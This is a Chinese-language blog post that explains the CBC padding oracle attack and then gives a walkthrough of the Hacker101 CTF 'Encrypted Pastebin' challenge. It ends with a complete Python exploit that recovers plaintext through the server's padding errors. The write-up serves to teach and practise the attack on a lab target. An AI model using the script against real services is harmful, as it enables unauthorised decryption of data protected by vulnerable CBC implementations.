---
layout: post
title: Padding Oracle Attack
date: 2020-04-21 00:03:00 +0300
description: Padding Oracle Attack CBC字节翻转攻击
img: 15084779796301.png!small # Add image post (optional)
tags: [归档] # add tag
---
***
### <font color=0066FF>序言</font>
<font color=green>在Eurocrypt 2002大会上，Vaudenay介绍了针对CBC模式的"Padding Oracle Attack"。它可以在不知道秘钥的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文。加密算法本身没有太大的问题，问题出在使用的方式上。</font>
### <font color=0066FF>原理</font>
在此以DES为例:在分组加密算法在实现加/解密时，需要把消息进行分组(block),block的大小常见的有64bit、128bit、256bit等。以CBC模式为例，其实现加密的过程大致如下：
![image](/assets/img/Padding_Attack/encode.png){:width="1350px"}
在这个过程中最后一个分组的消息长度没有达到block的大小，则需要填充一些字节，被称为padding。以8个字节为一个block为例:
比如明文是FIG,长度为3个字节，则剩下5个字节被填充了0x05,0x05,0x05,0x05,0x05这5个相同的字节，每个字节的值等于需要填充的字节长度。如果明文长度刚好为8个字节，如PLANTAIN,则后面需要填充8个字节的padding,其值为0x08。这种填充方法，遵循的是最常见的PKCS#5标准,可参见下方填充示意图:
![image](/assets/img/Padding_Attack/PKCS_5.png){:width="1350px"}
假设明文为:
>BRIAN;12;2;

经过DES加密（CBC模式）后，其密文为:
>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6

密文采用了ASCII十六进制的表示方法，即两个字符表示一个字节的十六进制数。将密文进行分组，密文的前8位为初始化向量IV。
<table width="1311.80" border="0" cellpadding="0" cellspacing="0" style='width:983.85pt;border-collapse:collapse;table-layout:fixed;'>
   <col width="171" style='mso-width-source:userset;mso-width-alt:4863;'/>
   <col width="47.53" span="24" style='mso-width-source:userset;mso-width-alt:1351;'/>
   <tr height="23" style='height:17.25pt;'>
    <td class="xl65" height="23" width="551.27" colspan="9" style='height:17.25pt;width:413.45pt;border-right:.5pt solid windowtext;border-bottom:.5pt solid windowtext;' x:str>INITIALIZATION VECTOR</td>
    <td class="xl65" width="380.27" colspan="8" style='width:285.20pt;border-right:.5pt solid windowtext;border-bottom:.5pt solid windowtext;' x:str>BLOCK 1 of 2</td>
    <td class="xl65" width="380.27" colspan="8" style='width:285.20pt;border-right:.5pt solid windowtext;border-bottom:.5pt solid windowtext;' x:str>BLOCK 2 of 2</td>
   </tr>
   <tr height="23" style='height:17.25pt;'>
    <td class="xl66" height="23" style='height:17.25pt;'></td>
    <td class="xl67" x:num>1</td>
    <td class="xl67" x:num>2</td>
    <td class="xl67" x:num>3</td>
    <td class="xl67" x:num>4</td>
    <td class="xl67" x:num>5</td>
    <td class="xl67" x:num>6</td>
    <td class="xl67" x:num>7</td>
    <td class="xl67" x:num>8</td>
    <td class="xl67" x:num>1</td>
    <td class="xl67" x:num>2</td>
    <td class="xl67" x:num>3</td>
    <td class="xl67" x:num>4</td>
    <td class="xl67" x:num>5</td>
    <td class="xl67" x:num>6</td>
    <td class="xl67" x:num>7</td>
    <td class="xl67" x:num>8</td>
    <td class="xl67" x:num>1</td>
    <td class="xl67" x:num>2</td>
    <td class="xl67" x:num>3</td>
    <td class="xl67" x:num>4</td>
    <td class="xl67" x:num>5</td>
    <td class="xl67" x:num>6</td>
    <td class="xl67" x:num>7</td>
    <td class="xl67" x:num>8</td>
   </tr>
   <tr height="23" style='height:17.25pt;'>
    <td class="xl65" height="23" style='height:17.25pt;' x:str>Plain-Text</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>Ｂ</td>
    <td class="xl68" x:str>Ｒ</td>
    <td class="xl65" x:str>I</td>
    <td class="xl65" x:str>A</td>
    <td class="xl65" x:str>N</td>
    <td class="xl65" x:str>;</td>
    <td class="xl68" x:num>1</td>
    <td class="xl68" x:num>2</td>
    <td class="xl65" x:str>;</td>
    <td class="xl68" x:num>2</td>
    <td class="xl65" x:str>;</td>
    <td class="xl68"></td>
    <td class="xl68"></td>
    <td class="xl68"></td>
    <td class="xl68"></td>
    <td class="xl68"></td>
   </tr>
   <tr height="23" style='height:17.25pt;'>
    <td class="xl65" height="23" style='height:17.25pt;' x:str>Plain-Text(Padded)</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>－</td>
    <td class="xl68" x:str>Ｂ</td>
    <td class="xl68" x:str>Ｒ</td>
    <td class="xl65" x:str>I</td>
    <td class="xl65" x:str>A</td>
    <td class="xl65" x:str>N</td>
    <td class="xl65" x:str>;</td>
    <td class="xl68" x:num>1</td>
    <td class="xl68" x:num>2</td>
    <td class="xl65" x:str>;</td>
    <td class="xl68" x:num>2</td>
    <td class="xl65" x:str>;</td>
    <td class="xl65" x:str>0x05</td>
    <td class="xl65" x:str>0x05</td>
    <td class="xl65" x:str>0x05</td>
    <td class="xl65" x:str>0x05</td>
    <td class="xl65" x:str>0x05</td>
   </tr>
   <tr height="23" style='height:17.25pt;'>
    <td class="xl65" height="23" style='height:17.25pt;' x:str>Encrypted Value</td>
    <td class="xl69" x:str>0x39</td>
    <td class="xl69" x:str>0x73</td>
    <td class="xl69" x:str>0x23</td>
    <td class="xl69" x:str>0x22</td>
    <td class="xl69" x:str>0x07</td>
    <td class="xl69" x:str>0x6A</td>
    <td class="xl69" x:str>0x26</td>
    <td class="xl69" x:str>0x3D</td>
    <td class="xl65" x:str>0xF8</td>
    <td class="xl65" x:str>0x51</td>
    <td class="xl65" x:str>0xD6</td>
    <td class="xl65" x:str>0xCC</td>
    <td class="xl65" x:str>0x68</td>
    <td class="xl65" x:str>0xFC</td>
    <td class="xl65" x:str>0x95</td>
    <td class="xl65" x:str>0x37</td>
    <td class="xl65" x:str>0x85</td>
    <td class="xl65" x:str>0x87</td>
    <td class="xl65" x:str>0x35</td>
    <td class="xl65" x:str>0xA2</td>
    <td class="xl65" x:str>0x8E</td>
    <td class="xl65" x:str>0xD4</td>
    <td class="xl65" x:str>0xAA</td>
    <td class="xl65" x:str>0xC6</td>
   </tr>
    <tr width="0" style='display:none;'>
     <td width="171" style='width:128;'></td>
     <td width="48" style='width:36;'></td>
    </tr>
  </table>
密文的长度为24个字节，可以整除8而不能整除16,因此可以很快判断出分组的长度应该为8个字节。其加密过程如下：
![image](/assets/img/Padding_Attack/encode_process.png){:width="1350px"}
初始化向量IV与明文XOR后，再经过运算得到的结果将作为新的IV,用于分组2。类似的，解密过程如下:
![image](/assets/img/Padding_Attack/decode_process.png){:width="1350px"}
在解密完成后，如果最后padding值不正确，解密程序往往会抛出异常<font color=red>(padding error)</font>。而利用应用的错误回显，攻击者往往可以判断出padding是否正确。<strong>所以Padding Oracle实际上是一种边信道攻击，攻击者只需要知道密文的解密结果是否正确即可.</strong>
可以通过很多手段来进行判断，比如在web应用中，如果是padding不正确，则应用程序很可能会返回500的错误：如果padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误。那么，以第一组分组为例，构造IV为8个0字节:
```
Request: http://sampleapp/home.jsp?UID=0000000000000000F851D6CC68FC9537
Response: 500 - Internal Server Error
```

此时在解密时padding是不正确的。
正确的padding值只能为:
 + 1个字节的padding为0x01
 + 2个字节的padding为0x02,0x02
 + 3个字节的padding为0x03,0x03,0x03
 + 4个字节的padding为0x04,0x04,0x04,0x04
 + ..............

因此可以通过慢慢调整IV的值，以希望解密后，最后一个字节的值为正确的padding byte,比如一个0x01。
```
Request: http://sampleapp/home.jsp?UID=0000000000000001F851D6CC68FC9537
Response: 500 - Internal Server Error
```
<strong>逐步调整IV值</strong>
此时因为Intermediary Value是固定的（我们此时不知道Intermediary Value的值是多少），因此从0x00到0xff之间，只有一个值与Intermediary Value的最后一个字节进行XOR后，结果是0x01。通过遍历就可以找出IV需要的最后一个字节：
![image](/assets/img/Padding_Attack/Valid_padding.png){:width="1350px"}
通过XOR运算，可以马上推导出此Intermediary Byte的值:
```
If [Intermediary Byte] ^ 0x3C == 0x01,
the [Intermediary Byte] == 0x3C ^ 0x01,
so [Intermediary Byte] == 0x3D
```
回头继续看加密过程：初始化向量IV与明文进行XOR运算得到了Intermediary Value,因此将刚才得到的Intermediary Byte: 0x3D与真实IV的最后一个字节0x0F进行XOR运算，即得到明文。
```
0x3D ^ 0x0f = 0x32
```
0x32是2的十六进制形式，刚好是明文!
Nice.我们已经正确匹配了<font color=red>padding "0x01"</font>，下面就是继续推导出剩下的<font color=red>Intermediary Byte</font>。在获得Intermediary Value后，通过与原来的IV进行XOR运算，即可得到明文。在这个过程中，仅仅用到了密文和IV,通过对Padding的推到，即可还原出明文，而不需要知道秘钥是什么。而IV并不需要保密，它往往是以明文形式发送的。
那么如何通过Padding Oracle使得密文能够解密为任意明文呢？实际上通过前面的解密过程可以看出，通过改变IV,可以控制整个解密过程。因此在已经获得了Intermediary Value的情况下，很快就可以通过XOR运算得到可以生成任意明文的IV。
对于多个分组的密文来说，从最后一组密文开始往前推。以两个分组为例，第二个分组为例，使用的IV就是第一个分组的密文（Cipher text）,因此当推导出第二个分组使用的IV时，将此IV值当做第一个分组的密文再次推导。分组的密文可以依次类推，即可找到解密为任意明文的密文了。

***
### <font color=0066FF>举例</font>
考虑到我们极具”现实主义者“的思维特点，在这里引出一个例子，此例为Hacker101- <a href="https://ctf.hacker101.com">Encrypted Pastebin</a>, <a href="https://ctf.hacker101.com/">Hackerone</a>是一个漏洞赏金平台，想获取该平台的项目资格，需解答<a href="https://ctf.hacker101.com">Hacker101 CTF</a>题目。不同的题目有不同数量的flag，每个flag因题目难度不同而对应不同积分（point）。每得26分就会获得一个私密项目邀请。
![image](/assets/img/Padding_Attack/CTF.png){:width="1350px"}
从提示文本中我们知道了加密算法是AES，密钥长度是128比特，那么分组便是16字节。此外我们还知道了加密用户数据的密钥没有保存在数据库中。
我们输入<font color=red>Title</font>为<font color=red>1</font>，内容也为<font color=red>1</font>，然后点击<font color=red>Post</font>按钮，页面跳转到了：
>http://35.227.24.107/b44435fe2a/?post=t7b3OgRqx2-QKRTErUqNfofKfmzfvZfUnm539JrKU8nPdp!o1zTFIsyQieGWuNgOEsAE1fEIKQBEdxcM2jUT5BvThqUF08QnvFFatmmlfqlyI0QLekTaN2vZO6PAmxNbx-OItN26FDkDHUjItXBnSeXCdovkq9EwvBLYFQOz!7bZEQ1h13NQU54-N6!OGUiz-v1sfK!Ee7lm0T5-cOY5dw~~
观察URL参数<font color=red>post</font>参数，
## Flag1
>http://35.227.24.107/b44435fe2a/?post=1
![image](/assets/img/Padding_Attack/Flag1.png){:width="1350px"}
在报错中我们看到了服务器是如何解码<font color=red>post</font>参数的：

```
b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
```

其实就是base64编码，只不过替换了3个关键字符。为简单起见，后文中就直接把它称做base64编码。在报错信息中我们还看到在按base64解码<font color=red>post</font>参数后，调用一个名为<font color=red>decryptLink</font>的函数解密它，解密后按UTF-8解码，并以json格式解析：

```
post = json.loads(decryptLink(postCt).decode('utf8'))
```
## Flag2
现在考虑触发别的报错，向服务器提交能成功base64解码但在调用<font color=red>decryptLink</font>解密时报错的数据。我们知道了如何解码<font color=red>post</font>参数，便也就知道了如何编码<font color=red>post</font>参数。提交<font color=red>post</font>参数为<font color=red>MTix</font>（一个有效的base64编码），这次报错为：
![image](/assets/img/Padding_Attack/Flag2.png){:width="1350px"}
这里有一个新的报错，在<font color=red>decrtptLink函数中有一行代码的内容是：

```
cipher = AES.new(staticKey, AES.MODE_CBC, iv)
```

这里可以看出<font color=red>post</font>参数使用的秘钥是静态的(<font color=red>statickey</font>)>还看到加密使用了CBC模式。报错中说IV(初始向量)长度必须是16字节，看来IV是从<font color=red>post</font>参数中提取出的。新的报错还提示<font color=red>IV</font>长度必须为<font color=red>16</font>字节长度。
再次修改参数：
![image](/assets/img/Padding_Attack/error.png){:width="1350px"}
从这个报错中我们看到了<font color=red>decryptLink</font>函数的最后一行代码，内容是：

```
return unpad(cipher.decrypt(data))
```

报错说<font color=red>string index out of range</font>，应该是提交的<font color=red>post</font>参数长度为<strong>16</strong>字节，刚够IV，实际数据为0，所以产生了这个错误。同时注意到有一个unpad操作，看函数名其功能应该是去掉填充（pad）。
我们将<font color=red>post</font>参数改为16的倍数，再次提交得到新的报错:

```
Traceback (most recent call last):
  File "./main.py", line 69, in index
    post = json.loads(decryptLink(postCt).decode('utf8'))
  File "./common.py", line 49, in decryptLink
    return unpad(cipher.decrypt(data))
  File "./common.py", line 22, in unpad
    raise PaddingException()
PaddingException
```

这次的报错中出现了<font color=red><strong>PaddingException</strong></font>，结合CBC模式是可以使用padding oracle攻击解出明文的。有疑问可以翻看上边的原理介绍。Exploit如下：

```
import base64
import requests

def decode(data):
    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))

def encode(data):
    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def bxor(b1, b2): # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result

def test(url, data):
    r = requests.get(url+'?post={}'.format(data))
    if 'PaddingException' in r.text:
        return False
    else:
        return True

def generate_iv_list(tail):
    iv = b'\x00' * (16 - len(tail) -1)
    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]

def padding_oracle(real_iv, url, data):
    index = 15
    plains = bytes()
    tail = bytes()
    while index >= 0:
        for iv in generate_iv_list(tail):
            if test(url, encode(iv+data)):
                plains = bytes([(16-index) ^ iv[index]]) + plains
                index -= 1
                tail = bytes([plain ^ (16-index) for plain in plains])
                break
    return bxor(real_iv, plains)

if __name__ == '__main__':
    post = 'LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~'
    url = 'http://35.190.155.168/fc2fd7e530/'

    i = 1
    plains = bytes()
    data = decode(post)
    length = len(data)
    while True:
        if i*16 < length:
            iv = data[(i-1)*16: i*16]
            plains += padding_oracle(iv, url, data[i*16: (i+1)*16])
        else:
            break
        i += 1
    print(plains)

```

运行脚本得到第二个Flag,未完待续...

